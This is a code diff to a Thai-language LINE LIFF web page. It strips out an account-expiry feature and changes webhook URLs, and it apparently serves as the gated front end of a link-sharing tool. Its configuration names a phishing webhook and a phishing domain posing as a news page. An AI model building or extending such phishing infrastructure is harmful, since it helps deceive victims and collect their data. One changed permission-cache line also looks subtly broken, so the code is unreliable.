@@ -166,7 +166,7 @@
             border-radius: 50%;
             object-fit: cover;
             margin-right: 20px;
-            border: 2px solid var (--primary-light);
+            border: 2px solid var(--primary-light);
             padding: 2px;
             background-color: white;
             box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
@@ -635,30 +635,6 @@
                 padding: 12px 15px;
             }
         }
-
-        .expiry-date {
-            font-size: 12px;
-            color: var(--text-light);
-            margin-top: 5px;
-            display: flex;
-            align-items: center;
-        }
-
-        .expiry-date i {
-            margin-right: 5px;
-        }
-
-        .expiry-active {
-            color: var(--success-color);
-        }
-
-        .expiry-warning {
-            color: var(--warning-color);
-        }
-
-        .expiry-expired {
-            color: var(--error-color);
-        }
     </style>
 </head>
 <body>
@@ -690,10 +666,6 @@
                         <div class="user-status">
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
-                        </div>
-                        <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
-                        <div class="expiry-date" id="expiryDateInfo">
-                            <i class="fas fa-hourglass-half"></i> <span id="expiryDateText">กำลังตรวจสอบ...</span>
                         </div>
                     </div>
                 </div>
@@ -762,8 +734,6 @@
         let pictureUrl = "";
         let isLiffInitialized = false;
         let userHasPermission = false;
-        let userIsExpired = false;  // เพิ่มตัวแปรเพื่อเก็บสถานะการหมดอายุ
-        let userExpiryDate = "";  // เพิ่มตัวแปรเพื่อเก็บวันหมดอายุ
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -771,8 +741,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwt5zqwo3LfKrrpWJ7EsrfI0vGneJBNVpuEin7UrGVvMWV5TacUe89mIgsBRcxS9jA/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwt5zqwo3LfKrrpWJ7EsrfI0vGneJBNVpuEin7UrGVvMWV5TacUe89mIgsBRcxS9jA/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -805,10 +775,7 @@
                 document.getElementById('userInfoSection').style.display = 'block';
                 
                 // ตรวจสอบสิทธิ์ผู้ใช้
-                const permissionData = await checkUserPermission(userId);
-                userHasPermission = permissionData.hasPermission;
-                userIsExpired = permissionData.isExpired || false;
-                userExpiryDate = permissionData.expiryDate || "ไม่ระบุ";
+                userHasPermission = await checkUserPermission(userId);
                 
                 if (userHasPermission) {
                     // มีสิทธิ์ใช้งาน
@@ -816,27 +783,13 @@
                     document.getElementById('statusBadge').textContent = 'อนุมัติแล้ว';
                     document.getElementById('statusBadge').className = 'badge approved';
                     enableForm();
-                    
-                    // แสดงวันหมดอายุ
-                    displayExpiryDate(userExpiryDate, userIsExpired);
                 } else {
                     // ไม่มีสิทธิ์ใช้งาน
-                    if (userIsExpired) {
-                        document.getElementById('userStatus').textContent = 'หมดอายุการใช้งาน';
-                        document.getElementById('statusBadge').textContent = 'หมดอายุ';
-                        document.getElementById('statusBadge').className = 'badge pending';
-                        document.getElementById('permissionMessage').innerHTML = '<p>สิทธิ์การใช้งานของคุณหมดอายุแล้ว กรุณาติดต่อผู้ดูแลระบบเพื่อต่ออายุ</p>';
-                    } else {
-                        document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
-                        document.getElementById('statusBadge').textContent = 'รออนุมัติ';
-                        document.getElementById('statusBadge').className = 'badge pending';
-                        document.getElementById('permissionMessage').innerHTML = '<p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>';
-                    }
+                    document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
+                    document.getElementById('statusBadge').textContent = 'รออนุมัติ';
+                    document.getElementById('statusBadge').className = 'badge pending';
                     document.getElementById('permissionMessage').style.display = 'block';
                     disableForm();
-                    
-                    // แสดงวันหมดอายุ
-                    displayExpiryDate(userExpiryDate, userIsExpired);
                 }
                 
                 isLiffInitialized = true;
@@ -858,72 +811,6 @@
             }
         }
         
-        // ฟังก์ชันใหม่: แสดงวันหมดอายุ
-        function displayExpiryDate(expiryDateStr, isExpired) {
-            const expiryDateElement = document.getElementById('expiryDateInfo');
-            const expiryDateTextElement = document.getElementById('expiryDateText');
-            
-            if (!expiryDateElement || !expiryDateTextElement) return;
-            
-            if (expiryDateStr === "ไม่ระบุ" || expiryDateStr === "ไม่มีวันหมดอายุ") {
-                expiryDateTextElement.textContent = "ไม่ระบุวันหมดอายุ";
-                expiryDateElement.className = "expiry-date";
-                return;
-            }
-            
-            expiryDateTextElement.textContent = `วันหมดอายุ: ${expiryDateStr}`;
-            
-            if (isExpired) {
-                expiryDateElement.className = "expiry-date expiry-expired";
-                expiryDateElement.querySelector("i").className = "fas fa-calendar-times";
-            } else {
-                // ตรวจสอบว่าใกล้หมดอายุหรือไม่
-                try {
-                    // แปลงวันที่เป็น Date object
-                    let expiryDate;
-                    
-                    // รูปแบบ DD/MM/YYYY HH:MM:SS
-                    if (expiryDateStr.match(/^\d{1,2}\/\d{1,2}\/\d{4}\s+\d{1,2}:\d{1,2}:\d{1,2}$/)) {
-                        const parts = expiryDateStr.split(' ');
-                        const dateParts = parts[0].split('/');
-                        const timeParts = parts[1].split(':');
-                        
-                        const day = parseInt(dateParts[0], 10);
-                        const month = parseInt(dateParts[1], 10) - 1;
-                        let year = parseInt(dateParts[2], 10);
-                        
-                        if (year > 2500) {
-                            year -= 543; // แปลงจาก พ.ศ. เป็น ค.ศ.
-                        }
-                        
-                        const hours = parseInt(timeParts[0], 10);
-                        const minutes = parseInt(timeParts[1], 10);
-                        const seconds = parseInt(timeParts[2], 10);
-                        
-                        expiryDate = new Date(year, month, day, hours, minutes, seconds);
-                    } else {
-                        // ถ้าไม่ตรงรูปแบบ DD/MM/YYYY HH:MM:SS ให้พยายามแปลงด้วย Date constructor
-                        expiryDate = new Date(expiryDateStr);
-                    }
-                    
-                    const now = new Date();
-                    const daysRemaining = Math.ceil((expiryDate - now) / (1000 * 60 * 60 * 24));
-                    
-                    if (daysRemaining <= 3) {
-                        // ใกล้หมดอายุภายใน 3 วัน
-                        expiryDateElement.className = "expiry-date expiry-warning";
-                        expiryDateElement.querySelector("i").className = "fas fa-exclamation-triangle";
-                    } else {
-                        expiryDateElement.className = "expiry-date expiry-active";
-                        expiryDateElement.querySelector("i").className = "fas fa-calendar-check";
-                    }
-                } catch (error) {
-                    console.error("ข้อผิดพลาดในการแปลงวันที่หมดอายุ:", error);
-                    expiryDateElement.className = "expiry-date";
-                }
-            }
-        }
-        
         // ตรวจสอบสิทธิ์ผู้ใช้
         async function checkUserPermission(userId) {
             try {
@@ -939,18 +826,12 @@
                     const savedPermission = localStorage.getItem('user_permission_' + userId);
                     const savedTime = parseInt(localStorage.getItem('user_permission_time_' + userId) || '0');
                     const currentTime = new Date().getTime();
-                    const savedExpired = localStorage.getItem('user_expired_' + userId) === 'true';
-                    const savedExpiryDate = localStorage.getItem('user_expiry_date_' + userId);
                     
                     // ถ้าข้อมูลไม่เกิน 15 นาที ให้ใช้ค่าจาก localStorage (ลดจาก 30 นาที เหลือ 15 นาที)
-                    if (savedPermission && savedExpiryDate && (currentTime - savedTime < 15 * 60 * 1000)) {
+                    if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
                         statusEl.textContent = originalText;
-                        return {
-                            hasPermission: savedPermission === 'true',
-                            isExpired: savedExpired,
-                            expiryDate: savedExpiryDate
-                        };
+                        return resolve(savedPermission === 'true');
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -969,13 +850,10 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
-                            console.log("ข้อมูลวันหมดอายุจาก API:", data.expiryDate, "หมดอายุแล้ว:", data.isExpired);
                             
                             // บันทึกสิทธิ์ใน localStorage
                             try {
                                 localStorage.setItem('user_permission_' + userId, data.hasPermission ? 'true' : 'false');
-                                localStorage.setItem('user_expired_' + userId, data.isExpired ? 'true' : 'false');
-                                localStorage.setItem('user_expiry_date_' + userId, data.expiryDate || "ไม่ระบุ");
                                 localStorage.setItem('user_permission_time_' + userId, new Date().getTime().toString());
                                 // บันทึกข้อความสถานะด้วยถ้ามี
                                 if (data.userStatus) {
@@ -988,30 +866,16 @@
                             if (data.hasPermission !== undefined) {
                                 // คืนค่าข้อความเดิม
                                 statusEl.textContent = originalText;
-                                resolve({
-                                    hasPermission: data.hasPermission === true,
-                                    isExpired: data.isExpired === true,
-                                    expiryDate: data.expiryDate || "ไม่ระบุ"
-                                });
+                                resolve(data.hasPermission === true);
                             } else {
                                 console.log("ข้อมูลสิทธิ์ไม่สมบูรณ์, ใช้การตรวจสอบสำรอง");
                                 statusEl.textContent = originalText;
-                                const fallbackResult = checkUserPermissionFallback(userId);
-                                resolve({
-                                    hasPermission: fallbackResult,
-                                    isExpired: false,
-                                    expiryDate: "ไม่ระบุ (สำรอง)"
-                                });
+                                resolve(checkUserPermissionFallback(userId));
                             }
                         } else {
                             console.log("ข้อมูลสิทธิ์ไม่ถูกต้อง, ใช้การตรวจสอบสำรอง");
                             statusEl.textContent = originalText;
-                            const fallbackResult = checkUserPermissionFallback(userId);
-                            resolve({
-                                hasPermission: fallbackResult,
-                                isExpired: false,
-                                expiryDate: "ไม่ระบุ (สำรอง)"
-                            });
+                            resolve(checkUserPermissionFallback(userId));
                         }
                         
                         // ลบ callback หลังจากใช้งานเสร็จ
@@ -1066,12 +930,7 @@
                 });
             } catch (error) {
                 console.error('Error checking permission:', error);
-                const fallbackResult = checkUserPermissionFallback(userId);
-                return {
-                    hasPermission: fallbackResult,
-                    isExpired: false,
-                    expiryDate: "ไม่ระบุ (ข้อผิดพลาด)"
-                };
+                return checkUserPermissionFallback(userId);
             }
         }
 
@@ -1568,21 +1427,10 @@
             }
             
             if (!userHasPermission) {
-                if (userIsExpired) {
-                    showStatus('สิทธิ์การใช้งานของคุณหมดอายุแล้ว กรุณาติดต่อผู้ดูแลระบบเพื่อต่ออายุ', false);
-                } else {
-                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
-                }
+                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                 return;
             }
             
-            // ตรวจสอบการหมดอายุอีกครั้งก่อนแชร์ (กรณีที่หมดอายุระหว่างใช้งาน)
-            if (userIsExpired) {
-                showStatus('สิทธิ์การใช้งานของคุณหมดอายุแล้ว กรุณาติดต่อผู้ดูแลระบบเพื่อต่ออายุ', false);
-                disableForm();
-                return;
-            }
-
             const caseName = document.getElementById('caseName').value;
             if (!caseName) {
                 showStatus('กรุณาระบุชื่อเคส', false);
